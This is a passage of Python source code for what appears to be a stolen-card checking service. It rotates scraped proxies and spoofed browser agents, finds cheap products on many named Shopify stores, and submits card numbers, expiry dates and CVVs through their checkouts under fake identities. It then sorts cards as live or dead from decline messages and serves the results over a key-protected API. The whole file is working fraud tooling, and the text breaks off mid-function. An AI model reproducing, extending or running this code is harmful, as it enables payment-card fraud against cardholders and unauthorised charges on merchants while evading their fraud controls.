import os
import time
import random
import string
import threading
import itertools
import re
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

API_KEY = os.environ.get("API_KEY", "kanha-secret-2024")
app     = FastAPI(docs_url=None, redoc_url=None)

# ─────────────────────────────────────────
# AGENTS + IDENTITIES
# ─────────────────────────────────────────

AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1",
]

IDENTITIES = [
    {"first":"James",   "last":"Carter",   "addr":"742 Evergreen Terrace","city":"Springfield",  "state":"IL","zip":"62704"},
    {"first":"Emily",   "last":"Brooks",   "addr":"350 Fifth Avenue",     "city":"New York",     "state":"NY","zip":"10118"},
    {"first":"Michael", "last":"Torres",   "addr":"1 Infinite Loop",      "city":"Austin",       "state":"TX","zip":"73301"},
    {"first":"Sarah",   "last":"Mitchell", "addr":"221B Baker Street",    "city":"Portland",     "state":"OR","zip":"97201"},
    {"first":"David",   "last":"Hayes",    "addr":"500 Oracle Pkwy",      "city":"Seattle",      "state":"WA","zip":"98101"},
    {"first":"Lisa",    "last":"Johnson",  "addr":"100 Main Street",      "city":"Denver",       "state":"CO","zip":"80201"},
    {"first":"Robert",  "last":"Wilson",   "addr":"200 Park Avenue",      "city":"Houston",      "state":"TX","zip":"77001"},
    {"first":"Karen",   "last":"Martinez", "addr":"900 N Michigan Ave",   "city":"Chicago",      "state":"IL","zip":"60611"},
    {"first":"Daniel",  "last":"Lee",      "addr":"1 Apple Park Way",     "city":"Cupertino",    "state":"CA","zip":"95014"},
    {"first":"Jessica", "last":"Brown",    "addr":"410 Terry Ave N",      "city":"Seattle",      "state":"WA","zip":"98109"},
]

SEED_DOMAINS = [
    "allbirds.com","gymshark.com","fashionnova.com","bombas.com",
    "mejuri.com","rothys.com","tentree.com","rarebeauty.com",
    "feastables.com","hexclad.com","blendjet.com","ourplace.com",
    "chubbiesshorts.com","puravidabracelets.com","nativecos.com",
    "trueclassictees.com","cuts.com","colourpop.com","morphe.com",
    "juicycouture.com","mvmtwatches.com","drinkag1.com","kotn.com",
    "vuoriclothing.com","mack-weldon.com","peachslices.com",
    "mudwtr.com","ruggable.com","brooklinen.com","tecovas.com",
    "byhumankind.com","graza.co","brightland.co","olipop.com",
    "nobull.com","rhone.com","cotopaxi.com","duer.com",
    "cometeer.com","backcountry.com","uncommongoods.com",
    "framebridge.com","minted.com","chatbooks.com","lovepop.com",
    "mixbook.com","oura.com","whoop.com","casper.com",
    "tuftandneedle.com","leesa.com","parachutehome.com",
    "cozyearth.com","article.com","burrow.com","joybird.com",
    "droplabs.com","flowhydration.com","arhaus.com","hayneedle.com",
    "cb2.com","anthropologie.com","urbanoutfitters.com",
    "freepeople.com","nasty-gal.com","loefflerrandall.com",
    "maisonette.com","society6.com","redbubble.com","teepublic.com",
    "threadless.com","printful.com","gelato.com","kizik.com",
    "bonlook.com","flowstate.com","originalgrains.com","naadam.co",
    "smallbatchsoaps.com","oars-alps.com","minnidip.com",
    "madeinhq.com","teakhaus.com","snowpeak.com","barebones.com",
    "skims.com","potterybarn.com","westelm.com","crate.com",
    "serenaandlily.com","lulu-and-georgia.com","shopdisney.com",
    "shopify.com","shein.com","shoptiques.com","shopbop.com",
    "revolve.com","fashionphile.com","forwardforward.com",
    "karmaloop.com","tobi.com","romwe.com","zaful.com",
    "asos.com","boohoo.com","misguided.com","prettylittlething.com",
    "hm.com","zara.com","uniqlo.com","gap.com",
    "levi.com","calvinklein.com","tommyhilfiger.com","ralphlauren.com",
    "lacoste.com","champion.com","nike.com","adidas.com",
    "puma.com","reebok.com","newbalance.com","underarmour.com",
    "skechers.com","vans.com","converse.com","timberland.com",
    "ugg.com","crocs.com","birkenstock.com","clarks.com",
    "stevemadden.com","dsw.com","zappos.com","shoecarnival.com",
    "nordstrom.com","bloomingdales.com","macys.com","lordandtaylor.com",
    "saks.com","bergdorfgoodman.com","neimanmarcus.com",
    "shopspring.com","mytheresa.com","matchesfashion.com",
    "net-a-porter.com","farfetch.com","ssense.com","mrporter.com",
    "endclothing.com","sneakersnstuff.com","extra-butter.com",
    "kith.com","concepts.com","undefeated.com","bodega.com",
    "dover-street-market.com","10cor.red","klekt.com",
    "goat.com","stockx.com","flightclub.com","stadium-goods.com",
    "sneakerpolitics.com","deadstock.ca","sneakercon.com",
    "kickscrew.com","novelship.com","88kicks.com","laced.com",
    "courir.com","footlocker.com","finishline.com","champs.com",
    "jdsports.com","sportscheck.com","schuh.co.uk","offspring.co.uk",
    "size.co.uk","footpatrol.com","hanon-shop.com","slamjam.com",
    "cettire.com","italist.com","yoox.com","theoutnet.com",
    "shopbazaar.com","barneysny.com","henribendel.com","intermixonline.com",
    "shopboss.com","shopaware.com","shopify.ca","shopify.in",
    "shopmyexchange.com","shopnbc.com","shopnow.com","shopsimply.com",
    "shopspell.com","shopsunrise.com","shopswagger.com","shoptokyo.com",
    "shopvida.com","shopworn.com","shopzio.com","shopzilla.com",
    "shopzite.com","shopify.sg","shopify.au","shopify.nz",
    "shopify.ie","shopify.gb","shopify.hk","shopify.my",
    "shopify.ph","shopify.th","shopify.vn","shopify.id",
    "printify.com","gooten.com","printaura.com","apliiq.com",
    "customcat.com","printdrop.com","teechip.com","teespring.com",
    "bonfire.com","represent.com","merch.ly","creator-spring.com",
]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
]

EMOJI_MAP = {
    "UNITED STATES":"🇺🇸","INDIA":"🇮🇳","UNITED KINGDOM":"🇬🇧",
    "CANADA":"🇨🇦","AUSTRALIA":"🇦🇺","GERMANY":"🇩🇪",
    "FRANCE":"🇫🇷","BRAZIL":"🇧🇷","SOUTH KOREA":"🇰🇷",
    "JAPAN":"🇯🇵","CHINA":"🇨🇳","RUSSIA":"🇷🇺",
    "MEXICO":"🇲🇽","ITALY":"🇮🇹","SPAIN":"🇪🇸",
    "NETHERLANDS":"🇳🇱","SINGAPORE":"🇸🇬","HONG KONG":"🇭🇰",
    "TURKEY":"🇹🇷","SAUDI ARABIA":"🇸🇦","THAILAND":"🇹🇭",
    "INDONESIA":"🇮🇩","PAKISTAN":"🇵🇰","NIGERIA":"🇳🇬",
    "SWEDEN":"🇸🇪","NORWAY":"🇳🇴","DENMARK":"🇩🇰",
    "FINLAND":"🇫🇮","POLAND":"🇵🇱","UKRAINE":"🇺🇦",
    "ARGENTINA":"🇦🇷","CHILE":"🇨🇱","COLOMBIA":"🇨🇴",
}

LIVE_CODES = {
    "insufficient_funds","do_not_honor","transaction_not_allowed",
    "restricted_card","card_velocity_exceeded","withdrawal_limit_exceeded",
    "generic_decline","try_again_later","authentication_required",
    "call_issuer","card_not_supported","currency_not_supported",
    "duplicate_transaction","not_permitted","no_action_taken",
    "revocation_of_all_authorizations","stop_payment_order",
    "exceeds_withdrawal_frequency_limit","new_account_information_available",
}

DEAD_CODES = {
    "incorrect_number","invalid_number","invalid_expiry_date",
    "invalid_cvc","expired_card","card_declined","pickup_card",
    "lost_card","stolen_card","blocked_card","fraudulent",
    "incorrect_pin","invalid_account","account_closed","security_violation",
}

LIVE_MSGS = [
    "insufficient","do not honor","not permitted","restricted",
    "velocity","try again","exceeds","withdrawal","call issuer",
    "not allowed","currency","generic decline",
]

DEAD_MSGS = [
    "invalid card","invalid number","expired","incorrect cvc",
    "incorrect number","stolen","lost card","pickup","fraudulent",
    "closed account","invalid account",
]

TDS_SIGNALS = [
    "authentication_required","3d_secure","3ds",
    "authentication required","3d secure","verify",
]

# ─────────────────────────────────────────
# PROXY MANAGER
# ─────────────────────────────────────────

class ProxyManager:
    def __init__(self):
        self._live       = []
        self._dead       = set()
        self._lock       = threading.Lock()
        self._cycle      = None
        self._refreshing = False

    def _fetch_raw(self):
        proxies = []
        for url in PROXY_SOURCES:
            try:
                r = requests.get(url, timeout=8,
                    headers={"User-Agent": random.choice(AGENTS)})
                if r.status_code == 200:
                    for line in r.text.strip().split("\n"):
                        line = line.strip()
                        if ":" in line and len(line) < 25:
                            proxies.append("http://" + line)
            except Exception:
                pass
        return list(set(proxies))

    def _test_proxy(self, proxy):
        try:
            r = requests.get(
                "http://ip-api.com/json",
                proxies={"http": proxy, "https": proxy},
                timeout=4,
                headers={"User-Agent": random.choice(AGENTS)}
            )
            return proxy if r.status_code == 200 else None
        except Exception:
            return None

    def refresh(self):
        if self._refreshing:
            return
        self._refreshing = True
        try:
            raw   = self._fetch_raw()
            batch = raw[:80]
            live  = []
            with ThreadPoolExecutor(max_workers=8) as ex:
                futures = {ex.submit(self._test_proxy, p): p for p in batch}
                for f in as_completed(futures):
                    result = f.result()
                    if result:
                        live.append(result)
            with self._lock:
                self._live  = live
                self._dead  = set()
                self._cycle = itertools.cycle(live) if live else None
            print(f"[proxy] {len(live)} live")
        except Exception as e:
            print(f"[proxy] error: {e}")
        finally:
            self._refreshing = False

    def _loop(self):
        while True:
            try:
                self.refresh()
            except Exception as e:
                print(f"[proxy] loop error: {e}")
            time.sleep(1800)

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def get(self):
        with self._lock:
            if not self._cycle or not self._live:
                return None
            for _ in range(len(self._live) + 1):
                try:
                    p = next(self._cycle)
                    if p not in self._dead:
                        return {"http": p, "https": p}
                except StopIteration:
                    break
        return None

    def mark_dead(self, proxy):
        with self._lock:
            if proxy:
                self._dead.add(proxy)

    def status(self):
        with self._lock:
            return {
                "live":  len(self._live),
                "dead":  len(self._dead),
                "ready": self._cycle is not None,
            }

proxy_mgr = ProxyManager()

# ─────────────────────────────────────────
# SHOP POOL
# ─────────────────────────────────────────

class ShopPool:
    def __init__(self):
        self._shops = []
        self._lock  = threading.Lock()
        self._idx   = 0

    def _safe_get(self, url):
        proxy = proxy_mgr.get()
        kw = {
            "timeout":         10,
            "allow_redirects": True,
            "headers": {
                "User-Agent":      random.choice(AGENTS),
                "Accept":          "application/json",
                "Accept-Language": "en-US,en;q=0.9",
            },
        }
        if proxy:
            kw["proxies"] = proxy
        try:
            return requests.get(url, **kw)
        except Exception:
            return None

    def _safe_post(self, url, json_data):
        proxy = proxy_mgr.get()
        kw = {
            "timeout":         10,
            "allow_redirects": True,
            "headers": {
                "User-Agent":   random.choice(AGENTS),
                "Content-Type": "application/json",
            },
            "json": json_data,
        }
        if proxy:
            kw["proxies"] = proxy
        try:
            return requests.post(url, **kw)
        except Exception:
            return None

    def _is_shopify(self, domain):
        try:
            r = self._safe_get(f"https://{domain}/products.json?limit=1")
            if r and r.status_code == 200:
                return "products" in r.json()
        except Exception:
            pass
        return False

    def _get_product(self, domain):
        try:
            r = self._safe_get(f"https://{domain}/products.json?limit=250")
            if not r or r.status_code != 200:
                return None
            candidates = []
            for p in r.json().get("products", []):
                for v in p.get("variants", []):
                    try:
                        price = float(v.get("price", 999))
                    except Exception:
                        continue
                    if 1.0 <= price <= 10.0:
                        candidates.append({
                            "variant_id":        v["id"],
                            "title":             p.get("title", ""),
                            "price":             price,
                            "requires_shipping": v.get("requires_shipping", True),
                        })
            if not candidates:
                return None
            digital = [c for c in candidates if not c["requires_shipping"]]
            return random.choice(digital) if digital else random.choice(candidates)
        except Exception:
            return None

    def _test_checkout(self, domain, variant_id):
        try:
            r = self._safe_post(
                f"https://{domain}/cart/add.js",
                {"id": variant_id, "quantity": 1}
            )
            return r is not None and r.status_code in (200, 201)
        except Exception:
            return False

    def _scan_one(self, domain):
        try:
            if not self._is_shopify(domain):
                return None
            product = self._get_product(domain)
            if not product:
                return None
            if not self._test_checkout(domain, product["variant_id"]):
                return None
            print(f"[shop] OK {domain}")
            return {
                "domain":     domain,
                "variant_id": product["variant_id"],
                "title":      product["title"],
                "price":      product["price"],
                "healthy":    True,
                "failures":   0,
                "cooled_at":  0.0,
                "total":      0,
                "success":    0,
            }
        except Exception:
            return None

    def scan(self):
        print(f"[scanner] scanning {len(SEED_DOMAINS)} domains...")
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {ex.submit(self._scan_one, d): d for d in SEED_DOMAINS}
            for f in as_completed(futures):
                result = f.result()
                if result:
                    with self._lock:
                        existing = {s["domain"] for s in self._shops}
                        if result["domain"] not in existing:
                            self._shops.append(result)
        print(f"[scanner] total: {len(self._shops)}")

    def _loop(self):
        while True:
            try:
                self.scan()
            except Exception as e:
                print(f"[scanner] error: {e}")
            time.sleep(3600)

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def get(self):
        with self._lock:
            now = time.time()
            for s in self._shops:
                if not s["healthy"] and (now - s["cooled_at"]) > 300:
                    s["healthy"]  = True
                    s["failures"] = 0
            alive = [s for s in self._shops if s["healthy"]]
            if not alive:
                return None
            self._idx = self._idx % len(alive)
            shop = alive[self._idx]
            self._idx += 1
            return shop

    def mark_fail(self, domain):
        with self._lock:
            for s in self._shops:
                if s["domain"] == domain:
                    s["failures"] += 1
                    s["cooled_at"] = time.time()
                    if s["failures"] >= 3:
                        s["healthy"] = False
                    break

    def mark_win(self, domain):
        with self._lock:
            for s in self._shops:
                if s["domain"] == domain:
                    s["total"]   += 1
                    s["success"] += 1
                    s["failures"] = 0
                    break

    def status(self):
        with self._lock:
            return [
                {
                    "domain":   s["domain"],
                    "product":  s["title"],
                    "price":    f"${s['price']}",
                    "healthy":  s["healthy"],
                    "failures": s["failures"],
                    "rate":     f"{round(s['success']/s['total']*100)}%"
                               if s["total"] else "0%",
                }
                for s in self._shops
            ]

shop_pool = ShopPool()

# ─────────────────────────────────────────
# BIN CACHE
# ─────────────────────────────────────────

_bin_cache = {}
_bin_lock  = threading.Lock()
BIN_TTL    = 3600

def _flag(country):
    return EMOJI_MAP.get(country.upper(), "🌐")

def bin_lookup(cc):
    if not cc or len(cc) < 6:
        return {"brand":"UNKNOWN","issuer":"UNKNOWN",
                "country":"UNKNOWN","emoji":"🌐",
                "type":"UNKNOWN","level":"UNKNOWN"}
    bin6 = cc[:6]
    with _bin_lock:
        entry = _bin_cache.get(bin6)
        if entry and time.time() - entry["ts"] < BIN_TTL:
            return entry["data"]
    result = None
    try:
        r = requests.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={"Accept-Version":"3","User-Agent":random.choice(AGENTS)},
            timeout=5
        )
        if r.status_code == 200:
            d       = r.json()
            country = d.get("country",{}).get("name","UNKNOWN").upper()
            result  = {
                "brand":   d.get("scheme","UNKNOWN").upper(),
                "issuer":  d.get("bank",{}).get("name","UNKNOWN").upper(),
                "country": country,
                "emoji":   d.get("country",{}).get("emoji",_flag(country)),
                "type":    d.get("type","UNKNOWN").upper(),
                "level":   d.get("brand","UNKNOWN").upper(),
            }
    except Exception:
        pass
    if not result:
        try:
            r = requests.get(
                f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin6}",
                timeout=5
            )
            if r.status_code == 200:
                d       = r.json()
                country = d.get("country","UNKNOWN").upper()
                result  = {
                    "brand":   d.get("card","UNKNOWN").upper(),
                    "issuer":  d.get("bank","UNKNOWN").upper(),
                    "country": country,
                    "emoji":   _flag(country),
                    "type":    d.get("type","UNKNOWN").upper(),
                    "level":   "UNKNOWN",
                }
        except Exception:
            pass
    if not result:
        result = {"brand":"UNKNOWN","issuer":"UNKNOWN","country":"UNKNOWN",
                  "emoji":"🌐","type":"UNKNOWN","level":"UNKNOWN"}
    with _bin_lock:
        _bin_cache[bin6] = {"data": result, "ts": time.time()}
    return result

# ─────────────────────────────────────────
# UTILS
# ─────────────────────────────────────────

def luhn_check(cc):
    try:
        digits  = [int(d) for d in cc if d.isdigit()]
        if not (13 <= len(digits) <= 19):
            return False
        total   = 0
        reverse = digits[::-1]
        for i, d in enumerate(reverse):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10 == 0
    except Exception:
        return False

def validate_card(cc, month, year, cvv):
    if not cc or not cc.isdigit():
        return False, "CC_NOT_DIGITS"
    if not (13 <= len(cc) <= 19):
        return False, "CC_INVALID_LENGTH"
    if not luhn_check(cc):
        return False, "CC_LUHN_FAIL"
    try:
        if not (1 <= int(month) <= 12):
            return False, "INVALID_MONTH"
    except Exception:
        return False, "INVALID_MONTH"
    try:
        cur = time.localtime().tm_year % 100
        if int(str(year)[-2:]) < cur:
            return False, "CARD_EXPIRED"
    except Exception:
        return False, "INVALID_YEAR"
    if not cvv or not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return False, "INVALID_CVV"
    return True, "OK"

_seen_cards = set()
_seen_lock  = threading.Lock()

def is_duplicate(cc):
    with _seen_lock:
        if cc in _seen_cards:
            return True
        _seen_cards.add(cc)
        return False

def clear_duplicates():
    with _seen_lock:
        _seen_cards.clear()

# ─────────────────────────────────────────
# RATE LIMITER
# ─────────────────────────────────────────

RATE_LIMIT  = int(os.environ.get("RATE_LIMIT","100"))
_rl_counts  = defaultdict(list)
_rl_lock    = threading.Lock()

def is_rate_limited(key):
    now = time.time()
    with _rl_lock:
        _rl_counts[key] = [t for t in _rl_counts[key] if now - t < 60]
        if len(_rl_counts[key]) >= RATE_LIMIT:
            return True
        _rl_counts[key].append(now)
        return False

# ─────────────────────────────────────────
# HISTORY
# ─────────────────────────────────────────

_hist_lock    = threading.Lock()
_live_history = deque(maxlen=50)
_dead_history = deque(maxlen=50)
_logs         = deque(maxlen=200)
_stats        = {"total":0,"live":0,"dead":0,"unknown":0,"error":0}
_hourly       = defaultdict(lambda: {"live":0,"dead":0,"total":0})

def _hkey():
    t = time.localtime()
    return f"{t.tm_year}-{t.tm_mon:02d}-{t.tm_mday:02d} {t.tm_hour:02d}:00"

def record(card_line, result, elapsed):
    with _hist_lock:
        entry = {
            "card":   card_line,
            "result": result.get("result","ERROR"),
            "reason": result.get("reason",""),
            "shop":   result.get("shop",""),
            "time":   f"{elapsed:.2f}s",
            "ts":     time.time(),
        }
        r  = entry["result"]
        hk = _hkey()
        _stats["total"]      += 1
        _hourly[hk]["total"] += 1
        if r == "LIVE":
            _stats["live"]       += 1
            _hourly[hk]["live"]  += 1
            _live_history.append(entry)
        elif r == "DEAD":
            _stats["dead"]       += 1
            _hourly[hk]["dead"]  += 1
            _dead_history.append(entry)
        elif r == "UNKNOWN":
            _stats["unknown"] += 1
        else:
            _stats["error"]   += 1
        _logs.append(entry)

# ─────────────────────────────────────────
# CHECKOUT ENGINE
# ─────────────────────────────────────────

def rand_email(first, last):
    n       = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]
    return f"{first.lower()}{n}@{random.choice(domains)}"

def rand_amount(base_price):
    low  = max(1.0, float(base_price))
    high = min(10.0, low + 5.0)
    if high <= low:
        high = low + 1.0
    return f"{random.uniform(low, high):.2f}"

class PublicCheckout:
    def __init__(self, domain, variant_id, price):
        self.domain     = domain
        self.variant_id = variant_id
        self.price      = price
        self.idn        = random.choice(IDENTITIES)
        self.proxy      = proxy_mgr.get()
        self.session    = requests.Session()
        if self.proxy:
            self.session.proxies.update(self.proxy)
        self.session.headers.update({
            "User-Agent":      random.choice(AGENTS),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
        })

    def _url(self, path):
        return f"https://{self.domain}{path}"

    def _get(self, path):
        try:
            return self.session.get(self._url(path), timeout=12, allow_redirects=True)
        except Exception:
            return None

    def _post_json(self, path, data):
        try:
            self.session.headers.update({"Content-Type":"application/json"})
            return self.session.post(self._url(path), json=data, timeout=12, allow_redirects=True)
        except Exception:
            return None

    def _post_form(self, path, data):
        try:
            self.session.headers.update({"Content-Type":"application/x-www-form-urlencoded"})
            return self.session.post(self._url(path), data=data, timeout=12, allow_redirects=True)
        except Exception:
            return None

    def add_to_cart(self):
        r = self._post_json("/cart/add.js", {"id":self.variant_id,"quantity":1})
        return r is not None and r.status_code in (200, 201)

    def start_checkout(self):
        try:
            self._post_json("/cart/clear.js", {})
            time.sleep(0.3)
            self._post_json("/cart/add.js", {"id":self.variant_id,"quantity":1})
            r = self._get("/checkout")
            if not r:
                return None
            match = re.search(r"/checkouts?/([a-f0-9]{32})", r.url)
            if match:
                return match.group(1)
            match = re.search(r'"token"\s*:\s*"([a-f0-9]{32})"', r.text)
            if match:
                return match.group(1)
            return None
        except Exception:
            return None

    def fill_info(self, token):
        idn = self.idn
        self._post_form(f"/checkouts/{token}", {
            "utf8":    "✓",
            "_method": "patch",
            "checkout[email]":                        rand_email(idn["first"],idn["last"]),
            "checkout[shipping_address][first_name]": idn["first"],
            "checkout[shipping_address][last_name]":  idn["last"],
            "checkout[shipping_address][address1]":   idn["addr"],
            "checkout[shipping_address][city]":       idn["city"],
            "checkout[shipping_address][province]":   idn["state"],
            "checkout[shipping_address][country]":    "US",
            "checkout[shipping_address][zip]":        idn["zip"],
            "checkout[shipping_address][phone]":      f"555{random.randint(1000000,9999999)}",
            "button":  "",
        })

    def select_shipping(self, token):
        try:
            r = self._get(f"/checkouts/{token}/shipping_rates")
            if not r:
                return
            rates = r.json().get("shipping_rates", [])
            if rates:
                self._post_form(f"/checkouts/{token}", {
                    "_method":                     "patch",
                    "checkout[shipping_rate][id]": rates[0].get("id",""),
                    "button":                      "",
                })
        except Exception:
            pass

    def submit_payment(self, token, cc, month, year, cvv):
        idn    = self.idn
        amount = rand_amount(self.price)

        # method 1 — PATCH JSON
        try:
            r = self.session.patch(
                self._url(f"/checkouts/{token}"),
                json={
                    "checkout": {
                        "payment_gateway": "shopify_payments",
                        "credit_card": {
                            "number":             cc,
                            "first_name":         idn["first"],
                            "last_name":          idn["last"],
                            "month":              str(month),
                            "year":               str(year),
                            "verification_value": cvv,
                        },
                        "total_price": amount,
                    }
                },
                timeout=20
            )
            if r is not None:
                result = self._parse(r, amount)
                if result["result"] != "ERROR":
                    return result
        except Exception:
            pass

        # method 2 — form
        try:
            r = self._post_form(f"/checkouts/{token}", {
                "_method":                                        "patch",
                "checkout[payment_gateway]":                      "shopify_payments",
                "checkout[credit_card][number]":                   cc,
                "checkout[credit_card][name]":                     f"{idn['first']} {idn['last']}",
                "checkout[credit_card][month]":                    str(month),
                "checkout[credit_card][year]":                     str(year),
                "checkout[credit_card][verification_value]":       cvv,
                "checkout[total_price]":                           amount,
                "button":                                          "",
            })
            if r is not None:
                return self._parse(r, amount)
        except Exception as e:
            return {"result":"ERROR","reason":str(e),"message":"","amount":amount,"is_3ds":False}

        return {"result":"ERROR","reason":"BOTH_FAILED","message":"","amount":amount,"is_3ds":False}

    def _parse(self, r, amount):
        try:
            url  = getattr(r, "url", "")
            text = r.text.lower() if hasattr(r,"text") else ""
            is_3ds = any(x in text for x in TDS_SIGNALS)

            if "thank_you" in url or "thank-you" in url:
                return {"result":"LIVE","reason":"APPROVED","message":"Order placed","amount":amount,"is_3ds":is_3ds}
            if "processing" in url:
                return {"result":"LIVE","reason":"PROCESSING","message":"Processing","amount":amount,"is_3ds":is_3ds}

            live_texts = ["thank you for your order","order confirmed","payment successful","order #"]
            bank_live  = ["insufficient funds","do not honor","transaction not permitted","restricted","velocity"]
            dead_texts = ["card was declined","payment was declined","card number is invalid",
                          "security code is invalid","expiration date is invalid","card has expired"]

            for s in live_texts:
                if s in text:
                    return {"result":"LIVE","reason":"APPROVED","message":s,"amount":amount,"is_3ds":is_3ds}

            for s in bank_live:
                if s in text:
                    reason = s.upper().replace(" ","_")
                    return {"result":"LIVE","reason":reason,"message":s,"amount":amount,"is_3ds":is_3ds}

            if is_3ds:
                return {"result":"LIVE","reason":"3DS_REQUIRED","message":"3D Secure required","amount":amount,"is_3ds":True}

            for s in dead_texts:
                if s in text:
                    reason = s.upper().replace(" ","_")
                    return {"result":"DEAD","reason":reason,"message":s,"amount":amount,"is_3ds":False}

            try:
                data   = r.json()
                errors = data.get("checkout",{}).get("payment_errors",[])
                if errors:
                    err = str(errors[0]).lower()
                    if any(x in err for x in ["insufficient","honor","restricted","velocity","not permitted"]):
                        return {"result":"LIVE","reason":"BANK_SIGNAL","message":err,"amount":amount,"is_3ds":False}
                    if any(x in err for x in TDS_SIGNALS):
                        return {"result":"LIVE","reason":"3DS_REQUIRED","message":err,"amount":amount,"is_3ds":True}
                    return {"result":"DEAD","reason":"DECLINED","message":err,"amount":amount,"is_3ds":False}
            except Exception:
                pass

            return {"result":"UNKNOWN","reason":"NO_SIGNAL","message":"","amount":amount,"is_3ds":False}

        except Exception as e:
            return {"result":"ERROR","reason":str(e),"message":"","amount":amount,"is_3ds":False}


def run_checkout(shop, cc, month, year, cvv):
    try:
        co = PublicCheckout(shop["domain"], shop["variant_id"], shop["price"])
        if not co.add_to_cart():
            return {"result":"ERROR","reason":"CART_FAILED","message":"","amount":"0.00","is_3ds":False}
        token = co.start_checkout()
        if not token:
            return {"result":"ERROR","reason":"CHECKOUT_FAILED","message":"","amount":"0.00","is_3ds":False}
        co.fill_info(token)
        time.sleep(random.uniform(0.3, 0.6))
        co.select_shipping(token)
        time.sleep(random.uniform(0.2, 0.4))
        return co.submit_payment(token, cc, month, year, cvv)
    except Exception as e:
        return {"result":"ERROR","reason":str(e),"message":"","amount":"0.00","is_3ds":False}

# ─────────────────────────────────────────
# CORE CHECK
# ─────────────────────────────────────────

def check_card(cc, month, year, cvv):
    for attempt in range(3):
        shop = shop_pool.get()
        if not shop:
            time.sleep(2)
            continue
        try:
            result = run_checkout(shop, cc, month, year, cvv)
            if result["result"] == "ERROR":
                shop_pool.mark_fail(shop["domain"])
                continue
            shop_pool.mark_win(shop["domain"])
            result["shop"] = shop["domain"]
            return result
        except Exception as e:
            shop_pool.mark_fail(shop["domain"])
            if attempt == 2:
                return {"result":"ERROR","reason":str(e),"message":"","amount":"0.00","shop":shop["domain"],"is_3ds":False}
            time.sleep(1.0)
    return {"result":"ERROR","reason":"MAX_RETRIES","message":"","amount":"0.00","shop":"none","is_3ds":False}


def format_resp(cc, month, year, cvv, result, elapsed):
    try:
        bin_data = bin_lookup(cc)
    except Exception:
        bin_data = {"brand":"UNKNOWN","issuer":"UNKNOWN","country":"UNKNOWN","emoji":"🌐","type":"UNKNOWN","level":"UNKNOWN"}

    country = f"{bin_data['emoji']} {bin_data['country']}"
    is_live = result.get("result") == "LIVE"
    is_3ds  = result.get("is_3ds", False)
    reason  = result.get("reason","UNKNOWN")

    if is_live and is_3ds:
        status_msg = "CCN - 3D Secure"
    elif is_live:
        status_msg = "CCN - " + reason
    else:
        status_msg = reason

    return {
        "cc":       f"{cc}|{month}|{year}|{cvv}",
        "Gateway":  "Shopify Payments",
        "Response": status_msg,
        "Amount":   result.get("amount","1.00"),
        "Currency": "USD",
        "Brand":    bin_data["brand"],
        "Type":     bin_data["type"],
        "Level":    bin_data["level"],
        "Issuer":   bin_data["issuer"],
        "Country":  country,
        "3DS":      is_3ds,
        "Shop":     result.get("shop",""),
        "Status":   is_live,
        "Proxy":    "Used" if proxy_mgr.status()["live"] > 0 else "Not Used",
        "Time":     f"{elapsed:.2f}s",
    }

# ─────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────

@app.on_event("startup")
async def on_startup():
    threading.Thread(target=proxy_mgr.start, daemon=True).start()
    threading.Thread(target=shop_pool.start, daemon=True).start()
    print("[+] started")

@app.exception_handler(Exception)
async def global_error(request: Request, exc: Exception):
    return JSONResponse(status_code=500, content={"error": str(exc)})

# ─────────────────────────────────────────
# MODELS
# ─────────────────────────────────────────

class CardReq(BaseModel):
    cc: str; month: str; year: str; cvv: str

class BulkReq(BaseModel):
    cards: list[str]
    delay: Optional[float] = 1.2

# ─────────────────────────────────────────
# GET ROUTES — browser se seedha
# ─────────────────────────────────────────

@app.get("/")
def root():
    try:
        alive = sum(1 for s in shop_pool._shops if s["healthy"])
        total = len(shop_pool._shops)
        prx   = proxy_mgr.status()["live"]
    except Exception:
        alive = 0; total = 0; prx = 0
    return {"status":"alive","shops":f"{alive}/{total}","proxies":prx}


@app.get("/check")
def check_get(cc: str, month: str, year: str, cvv: str, key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    if is_rate_limited(key):
        return JSONResponse(status_code=429, content={"error":"RATE_LIMIT_EXCEEDED"})

    ok, reason = validate_card(cc, month, year, cvv)
    if not ok:
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Gateway":"Shopify Payments",
                "Response":reason,"Status":False,"Time":"0.00s"}

    if is_duplicate(cc):
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Gateway":"Shopify Payments",
                "Response":"DUPLICATE_CARD","Status":False,"Time":"0.00s"}

    start   = time.time()
    res     = check_card(cc, month, year, cvv)
    elapsed = time.time() - start
    out     = format_resp(cc, month, year, cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.get("/shops")
def shops_get(key: str = ""):
    if key != API_KEY:
        return JSONResponse(status_code=401, content={"error":"INVALID_KEY"})
    return {"shops": shop_pool.status()}


@app.get("/proxies")
def proxies_get(key: str = ""):
    if key != API_KEY:
